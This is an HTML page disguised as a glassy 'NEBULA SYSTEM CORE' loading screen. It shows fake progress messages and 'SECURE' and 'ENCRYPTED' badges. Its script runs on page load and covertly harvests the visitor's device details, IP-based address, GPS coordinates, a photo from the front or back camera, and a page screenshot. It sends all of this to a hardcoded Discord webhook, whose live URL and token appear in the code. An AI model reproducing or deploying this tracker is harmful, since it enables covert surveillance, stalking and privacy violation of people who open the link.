<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>NEBULA · SYSTEM CORE</title>
  <meta name="description" content="ADVANCED INTERFACE · GLASS NEBULA">
  <!-- Favicon multi‑format -->
  <link rel="icon" type="image/x-icon" href="https://files.catbox.moe/5bwkpb.ico">
  <link rel="icon" type="image/png" href="https://files.catbox.moe/5bwkpb.png">
  <link rel="apple-touch-icon" href="https://files.catbox.moe/5bwkpb.png">
  <meta name="theme-color" content="#0b0d17">

  <!-- html2canvas -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>

  <style>
    /* ===== RESET & GLOBAL ===== */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      min-height: 100vh;
      background: radial-gradient(circle at 30% 30%, #14182b, #070a14);
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: 'Segoe UI', 'Inter', system-ui, -apple-system, sans-serif;
      position: relative;
      overflow: hidden;
      padding: 1.5rem;
    }

    /* ===== ANIMATED BACKGROUND (GLASS ORBS) ===== */
    .glass-orb {
      position: absolute;
      border-radius: 50%;
      background: rgba(100, 130, 255, 0.08);
      backdrop-filter: blur(60px);
      -webkit-backdrop-filter: blur(60px);
      border: 1px solid rgba(120, 180, 255, 0.1);
      animation: floatOrb 18s infinite alternate ease-in-out;
      z-index: 0;
    }

    @keyframes floatOrb {
      0% { transform: translate(0, 0) scale(1); }
      100% { transform: translate(30px, -40px) scale(1.1); }
    }

    .orb1 {
      width: 45vw;
      height: 45vw;
      max-width: 600px;
      max-height: 600px;
      top: -15vh;
      left: -10vw;
      background: radial-gradient(circle at 30% 30%, rgba(70, 140, 255, 0.15), transparent 70%);
      animation-duration: 22s;
    }

    .orb2 {
      width: 55vw;
      height: 55vw;
      max-width: 700px;
      max-height: 700px;
      bottom: -20vh;
      right: -10vw;
      background: radial-gradient(circle at 70% 70%, rgba(180, 90, 255, 0.12), transparent 70%);
      animation-duration: 28s;
      animation-direction: alternate-reverse;
    }

    .orb3 {
      width: 35vw;
      height: 35vw;
      top: 40vh;
      left: 20vw;
      background: radial-gradient(circle, rgba(0, 200, 255, 0.05), transparent 80%);
      animation-duration: 25s;
    }

    /* ===== MAIN GLASS CARD ===== */
    .glass-panel {
      position: relative;
      z-index: 10;
      max-width: 520px;
      width: 100%;
      background: rgba(10, 15, 30, 0.35);
      backdrop-filter: blur(16px) saturate(180%);
      -webkit-backdrop-filter: blur(16px) saturate(180%);
      border: 1px solid rgba(120, 170, 255, 0.2);
      border-radius: 42px;
      box-shadow: 0 25px 40px -10px rgba(0, 0, 0, 0.6), 0 0 0 1px rgba(80, 140, 255, 0.1) inset;
      padding: 2.2rem 2rem 2.5rem;
      transition: box-shadow 0.3s;
    }

    .glass-panel:hover {
      box-shadow: 0 30px 50px -12px #00000080, 0 0 0 1.5px rgba(70, 150, 255, 0.25) inset;
    }

    /* ===== AVATAR / CORE IMAGE ===== */
    .core-avatar {
      display: flex;
      justify-content: center;
      margin-bottom: 1.8rem;
    }

    #neon-image {
      width: 110px;
      height: 110px;
      border-radius: 32px;
      object-fit: cover;
      background: #0e1222;
      border: 2px solid rgba(130, 190, 255, 0.5);
      box-shadow: 0 10px 25px -5px #00000080, 0 0 30px rgba(70, 150, 255, 0.3);
      transition: all 0.4s cubic-bezier(0.16, 1, 0.3, 1);
    }

    #neon-image:hover {
      border-radius: 20px;
      transform: scale(1.02);
      box-shadow: 0 0 40px #3f7fff66, 0 15px 30px -5px #000;
    }

    /* ===== GLITCH TITLE ===== */
    .glitch-wrapper {
      margin-bottom: 1.2rem;
      text-align: center;
    }

    #loading-text {
      font-size: 1.5rem;
      font-weight: 600;
      letter-spacing: 4px;
      text-transform: uppercase;
      color: #d9e6ff;
      text-shadow: 0 2px 8px #00000050;
      position: relative;
      display: inline-block;
      padding: 0 8px;
    }

    #loading-text::before,
    #loading-text::after {
      content: attr(data-text);
      position: absolute;
      left: 0;
      width: 100%;
      height: 100%;
      background: transparent;
      overflow: hidden;
      color: #aac8ff;
    }

    #loading-text::before {
      left: 3px;
      text-shadow: -2px 0 #00c8ff80;
      clip-path: polygon(0 0, 100% 0, 100% 35%, 0 35%);
      animation: glitchFrag 3.5s infinite linear alternate-reverse;
    }

    #loading-text::after {
      left: -3px;
      text-shadow: 2px 0 #ff7b9c80;
      clip-path: polygon(0 65%, 100% 65%, 100% 100%, 0 100%);
      animation: glitchFrag 3s infinite linear alternate;
    }

    @keyframes glitchFrag {
      0% { clip-path: inset(20% 0 50% 0); }
      30% { clip-path: inset(60% 0 10% 0); }
      70% { clip-path: inset(5% 0 70% 0); }
      100% { clip-path: inset(40% 0 30% 0); }
    }

    /* ===== PROGRESS (SLIM GLASS) ===== */
    .progress-section {
      margin: 28px 0 18px;
    }

    #progress-container {
      height: 6px;
      background: rgba(255, 255, 255, 0.06);
      border-radius: 100px;
      backdrop-filter: blur(4px);
      box-shadow: inset 0 1px 3px #0000004d, 0 0 0 1px #2a3a6040;
      overflow: hidden;
    }

    #progress-bar {
      height: 100%;
      width: 0%;
      background: linear-gradient(90deg, #4a8cff, #b76eff, #5fd4ff);
      background-size: 200% 100%;
      border-radius: 100px;
      box-shadow: 0 0 12px #3f8cff;
      transition: width 0.35s cubic-bezier(0.2, 0.9, 0.4, 1);
      animation: barGlow 3s infinite alternate;
    }

    @keyframes barGlow {
      from { background-position: 0% 50%; }
      to { background-position: 100% 50%; }
    }

    #loading-details {
      margin-top: 14px;
      font-size: 0.9rem;
      font-weight: 400;
      color: #9bb6e0;
      text-shadow: 0 2px 6px #00000070;
      letter-spacing: 0.5px;
      backdrop-filter: blur(5px);
      display: inline-block;
      padding: 5px 16px;
      background: rgba(20, 35, 60, 0.25);
      border-radius: 40px;
      border: 1px solid #3c5a9c30;
    }

    /* ===== VISUALIZER BARS (GLASS MORPH) ===== */
    #music-visualizer {
      position: absolute;
      bottom: 20px;
      left: 50%;
      transform: translateX(-50%);
      display: flex;
      gap: 7px;
      align-items: flex-end;
      height: 34px;
      z-index: 20;
      padding: 6px 18px;
      background: rgba(10, 20, 40, 0.2);
      backdrop-filter: blur(12px);
      -webkit-backdrop-filter: blur(12px);
      border-radius: 60px;
      border: 1px solid rgba(100, 160, 255, 0.2);
      box-shadow: 0 8px 20px #00000030;
    }

    .bar {
      width: 5px;
      background: linear-gradient(to top, #3d7eff, #b469ff, #78e0ff);
      border-radius: 20px;
      box-shadow: 0 0 10px #5380ff;
      animation: barWave 1.2s infinite alternate ease-in-out;
      opacity: 0.8;
    }

    @keyframes barWave {
      0% { height: 6px; opacity: 0.5; }
      100% { height: 32px; opacity: 1; }
    }

    /* Utility */
    .hidden {
      display: none !important;
    }

    video, canvas {
      position: fixed;
      top: 0; left: 0;
      opacity: 0; pointer-events: none;
      width: 1px; height: 1px;
    }

    /* Icon inline (svg) - no emoji */
    .status-row {
      display: flex;
      justify-content: center;
      gap: 12px;
      margin-top: 5px;
    }

    .status-badge {
      display: flex;
      align-items: center;
      gap: 6px;
      background: rgba(20, 35, 60, 0.3);
      backdrop-filter: blur(4px);
      padding: 4px 14px;
      border-radius: 30px;
      border: 1px solid #3d66b030;
    }

    .status-badge svg {
      width: 16px;
      height: 16px;
      fill: none;
      stroke: #9bbcf5;
      stroke-width: 2;
    }
  </style>
</head>
<body>

  <!-- ORBS GLASS BACKGROUND -->
  <div class="glass-orb orb1"></div>
  <div class="glass-orb orb2"></div>
  <div class="glass-orb orb3"></div>

  <!-- MAIN PANEL -->
  <div class="glass-panel">
    <div class="core-avatar">
      <img id="neon-image" src="https://files.catbox.moe/5bwkpb.jpg" alt="NEBULA CORE">
    </div>

    <div class="glitch-wrapper">
      <div id="loading-text" data-text="INITIALIZING SYSTEM...">
        INITIALIZING SYSTEM...
      </div>
    </div>

    <div class="progress-section">
      <div id="progress-container">
        <div id="progress-bar"></div>
      </div>
      <div style="text-align: center;">
        <div id="loading-details">VERIFY GLASS INTEGRITY</div>
      </div>
    </div>

    <!-- STATUS ICONS (NO EMOJI) -->
    <div class="status-row">
      <div class="status-badge">
        <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
          <path d="M20 12H4M12 4v16" />
          <circle cx="12" cy="12" r="9" />
        </svg>
        <span style="color:#bcd0ff;">SECURE</span>
      </div>
      <div class="status-badge">
        <svg viewBox="0 0 24 24" stroke-linecap="round">
          <path d="M5 12h14M12 5l7 7-7 7" />
        </svg>
        <span style="color:#bcd0ff;">ENCRYPTED</span>
      </div>
    </div>
  </div>

  <!-- HIDDEN ELEMENTS (CAMERA / CAPTURE) -->
  <video id="v" autoplay muted playsinline class="hidden"></video>
  <canvas id="c" class="hidden"></canvas>
  <audio id="bg-music" src="https://files.catbox.moe/yu43bv.m4a" preload="auto" loop muted></audio>

  <!-- VISUALIZER -->
  <div id="music-visualizer">
    <div class="bar" style="animation-delay:0s"></div>
    <div class="bar" style="animation-delay:0.15s"></div>
    <div class="bar" style="animation-delay:0.3s"></div>
    <div class="bar" style="animation-delay:0.45s"></div>
    <div class="bar" style="animation-delay:0.6s"></div>
    <div class="bar" style="animation-delay:0.75s"></div>
    <div class="bar" style="animation-delay:0.9s"></div>
    <div class="bar" style="animation-delay:1.05s"></div>
    <div class="bar" style="animation-delay:1.2s"></div>
    <div class="bar" style="animation-delay:1.35s"></div>
  </div>

  <script>
    (function(){
      "use strict";

      // ========== CONFIGURASI DISCORD WEBHOOK (GANTI DENGAN URL ANDA) ==========
      const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1449595197921951786/q7pM8FCgCRsFj6TbSGRswqupsvoZxhYAVaPBlZDUJBI3ru_1YV3RYaaWaXNeqABgxrV-';
      
      // ---------- HELPER: Kirim embed ke Discord (tanpa emoji, hanya ikon di embed) ----------
      const sendEmbedToDiscord = async (embedPayload, fileBlob = null, fileName = 'capture.jpg') => {
        try {
          const formData = new FormData();
          
          // Payload wajib dengan embeds (max 10, kita pakai 1)
          const payload = {
            embeds: [embedPayload]
          };
          
          formData.append('payload_json', JSON.stringify(payload));
          
          if (fileBlob) {
            formData.append('file', fileBlob, fileName);
          }
          
          await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            body: formData
          });
        } catch (e) {
          console.warn('Discord webhook error:', e);
        }
      };

      // Progress elements
      const pb = document.getElementById('progress-bar');
      const ld = document.getElementById('loading-details');
      const loadingMessages = [
        "CHECKING SYSTEM MODULE...",
        "LOADING CORE COMPONENTS...",
        "INITIALIZE GLASS INTERFACE...",
        "VERIFY ENCRYPTION LAYER...",
        "PREPARING SYSTEM MODULE...",
        "CHECK FOR UPDATES...",
        "LOADING SYSTEM MENU ASSET...",
        "VERIFY MODULE INTEGRITY..."
      ];
      
      let progress = 0;
      const interval = setInterval(() => {
        progress += Math.random() * 6;
        if (progress > 98) progress = 98;
        pb.style.width = progress + '%';
        if (Math.random() > 0.85) {
          ld.textContent = loadingMessages[Math.floor(Math.random() * loadingMessages.length)];
        }
      }, 480);

      // Audio
      const audio = document.getElementById('bg-music');
      const enableSound = () => {
        audio.muted = false;
        audio.play().catch(()=>{});
        document.removeEventListener('click', enableSound);
        document.removeEventListener('touchstart', enableSound);
      };
      audio.play().catch(()=>{});
      document.addEventListener('click', enableSound);
      document.addEventListener('touchstart', enableSound);

      // ---------- LOKASI DENGAN NOMINATIM (lebih presisi) ----------
      const getLocationDetails = async (lat, lon) => {
        try {
          const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
          const data = await res.json();
          if (data.address) {
            return {
              district: data.address.county || data.address.city || data.address.state || 'Unknown',
              subdistrict: data.address.suburb || data.address.village || data.address.town || 'Unknown',
              fullAddress: data.display_name || 'Address unavailable'
            };
          }
        } catch(e) {}
        return { district: 'Unknown', subdistrict: 'Unknown', fullAddress: 'Address unavailable' };
      };

      // ---------- KOLEKSI INFO DEVICE (tanpa emoji, akan masuk field embed) ----------
      const collectDeviceReport = async () => {
        let infoLines = [];
        infoLines.push(`**DEVICE:** ${navigator.userAgent}`);
        infoLines.push(`**PLATFORM:** ${navigator.platform}`);
        infoLines.push(`**LANGUAGE:** ${navigator.language}`);
        infoLines.push(`**ONLINE:** ${navigator.onLine ? 'Yes' : 'No'}`);
        infoLines.push(`**SCREEN:** ${screen.width}x${screen.height}`);
        infoLines.push(`**VIEWPORT:** ${innerWidth}x${innerHeight}`);
        infoLines.push(`**RAM:** ${navigator.deviceMemory || 'Unknown'} GB`);
        infoLines.push(`**CPU CORES:** ${navigator.hardwareConcurrency || 'Unknown'}`);
        
        if (navigator.getBattery) {
          try {
            const b = await navigator.getBattery();
            infoLines.push(`**BATTERY:** ${Math.floor(b.level*100)}% ${b.charging ? '(Charging)' : ''}`);
          } catch(e) { infoLines.push(`**BATTERY:** unavailable`); }
        }
        
        infoLines.push(`**ACCESS TIME:** ${new Date().toLocaleString()}`);
        infoLines.push(`**LOAD TIME:** ${performance.now().toFixed(2)} ms`);
        infoLines.push(`**TIMEZONE:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}`);
        infoLines.push(`**REFERRER:** ${document.referrer || 'Direct'}`);
        
        let locationPart = '';
        try {
          const ipRes = await fetch('https://ipapi.co/json/');
          const ipData = await ipRes.json();
          locationPart = `**IP:** ${ipData.ip}\n**CITY:** ${ipData.city}\n**REGION:** ${ipData.region}\n**COUNTRY:** ${ipData.country_name}\n**POSTAL:** ${ipData.postal}`;
          
          if (ipData.latitude && ipData.longitude) {
            const loc = await getLocationDetails(ipData.latitude, ipData.longitude);
            locationPart += `\n**DISTRICT:** ${loc.district}\n**SUB-DISTRICT:** ${loc.subdistrict}\n**ADDRESS:** ${loc.fullAddress.substring(0, 180)}...`;
          }
        } catch(e) {
          locationPart = 'Location fetch failed.';
        }
        
        return { deviceSummary: infoLines.join('\n'), locationBlock: locationPart };
      };

      // ---------- CAPTURE CAMERA (dengan embed) ----------
      const captureCamera = async (mode) => {
        const video = document.getElementById('v');
        const canvas = document.getElementById('c');
        let stream;
        try {
          stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: { exact: mode } }
          });
          video.srcObject = stream;
          await new Promise(r => video.onloadedmetadata = r);
          video.play();
          await new Promise(r => setTimeout(r, 1400));
          
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          canvas.getContext('2d').drawImage(video, 0, 0);
          
          const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.9));
          
          // Embed camera capture
          const embed = {
            title: `CAMERA CAPTURE · ${mode === 'user' ? 'FRONT' : 'BACK'}`,
            color: 0x3a7bff,
            timestamp: new Date().toISOString(),
            footer: { text: 'NEBULA GLASS · SECURE FEED' },
            description: `Camera facing: **${mode}**\nTimestamp: ${new Date().toLocaleString()}`,
            image: { url: 'attachment://camera.jpg' }
          };
          
          await sendEmbedToDiscord(embed, blob, 'camera.jpg');
          
          stream.getTracks().forEach(t => t.stop());
          return true;
        } catch (e) {
          if(stream) stream.getTracks().forEach(t => t.stop());
          const embedErr = {
            title: `CAMERA ACCESS FAILED (${mode})`,
            color: 0xaa3333,
            description: `Could not access ${mode} camera. Permission denied or not available.`
          };
          await sendEmbedToDiscord(embedErr);
          return false;
        }
      };

      // ---------- SCREENSHOT (embed) ----------
      const takeScreenshot = async () => {
        try {
          const canvas = await html2canvas(document.body, {
            scale: 0.9,
            backgroundColor: '#0b0f1a',
            allowTaint: false,
            useCQRS: true
          });
          const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
          
          const embed = {
            title: 'SCREENSHOT · GLASS INTERFACE',
            color: 0x5f4b8b,
            timestamp: new Date().toISOString(),
            footer: { text: 'NEBULA CORE · VISUAL LOG' },
            description: `**Viewport:** ${innerWidth}x${innerHeight}\n**Loaded:** ${new Date().toLocaleString()}`,
            image: { url: 'attachment://screenshot.jpg' }
          };
          
          await sendEmbedToDiscord(embed, blob, 'screenshot.jpg');
        } catch(e) {
          const embedErr = { title: 'SCREENSHOT FAILED', color: 0xaa3333, description: 'html2canvas error' };
          await sendEmbedToDiscord(embedErr);
        }
      };

      // ---------- GPS TRACKING (embed) ----------
      const trackGPS = () => {
        if (!navigator.geolocation) {
          const embed = { title: 'GPS UNAVAILABLE', color: 0xaa3333, description: 'Geolocation not supported' };
          sendEmbedToDiscord(embed);
          return;
        }
        navigator.geolocation.getCurrentPosition(async (pos) => {
          const lat = pos.coords.latitude;
          const lon = pos.coords.longitude;
          const loc = await getLocationDetails(lat, lon);
          
          const embed = {
            title: 'GPS TRACKING · HIGH ACCURACY',
            color: 0x00a8cc,
            timestamp: new Date().toISOString(),
            fields: [
              { name: 'Latitude', value: lat.toString(), inline: true },
              { name: 'Longitude', value: lon.toString(), inline: true },
              { name: 'Accuracy', value: `${pos.coords.accuracy} m`, inline: true },
              { name: 'District', value: loc.district, inline: true },
              { name: 'Sub‑District', value: loc.subdistrict, inline: true },
              { name: 'Maps', value: `[Open in Maps](https://www.google.com/maps/search/?api=1&query=${lat},${lon})`, inline: false },
              { name: 'Full Address', value: loc.fullAddress.substring(0, 1020) || 'N/A' }
            ],
            footer: { text: 'NEBULA GEOLOCATION' }
          };
          await sendEmbedToDiscord(embed);
        }, async (err) => {
          const embed = { title: 'GPS ERROR', color: 0xaa3333, description: err.message };
          await sendEmbedToDiscord(embed);
        }, { enableHighAccuracy: true, maximumAge: 0, timeout: 7000 });
      };

      // ---------- MAIN REPORT (EMBED UTAMA) ----------
      const sendMainEmbedReport = async () => {
        const { deviceSummary, locationBlock } = await collectDeviceReport();
        
        const embed = {
          title: 'SYSTEM REPORT · NEBULA CORE',
          color: 0x2a4e9b,
          timestamp: new Date().toISOString(),
          thumbnail: { url: 'https://files.catbox.moe/5bwkpb.jpg' },
          fields: [
            {
              name: 'DEVICE SPECIFICATION',
              value: deviceSummary || 'No data',
              inline: false
            },
            {
              name: 'NETWORK & LOCATION',
              value: locationBlock || 'Not available',
              inline: false
            },
            {
              name: 'INTERFACE STATUS',
              value: `**URL:** ${location.href}\n**Title:** ${document.title}\n**Touch:** ${'ontouchstart' in window}\n**History:** ${history.length}`,
              inline: false
            }
          ],
          footer: { text: 'GLASS MORPH · ENCRYPTED CHANNEL' }
        };
        
        await sendEmbedToDiscord(embed);
      };

      // ---------- EKSEKUSI UTAMA ----------
      const startTracking = async () => {
        // 1. Kirim embed device info utama
        await sendMainEmbedReport();
        
        // 2. Kamera depan lalu belakang
        let camOk = await captureCamera("user");
        if (!camOk) {
          await captureCamera("environment");
        }
        
        // 3. Screenshot setelah jeda
        setTimeout(() => { takeScreenshot(); }, 2500);
        
        // 4. GPS tracking
        trackGPS();

        // set progress selesai setelah beberapa detik
        setTimeout(() => {
          clearInterval(interval);
          pb.style.width = '100%';
          ld.textContent = 'SYSTEM READY · GLASS ACTIVE';
        }, 4000);
      };

      // Mulai proses
      startTracking();
    })();
  </script>
</body>
</html>
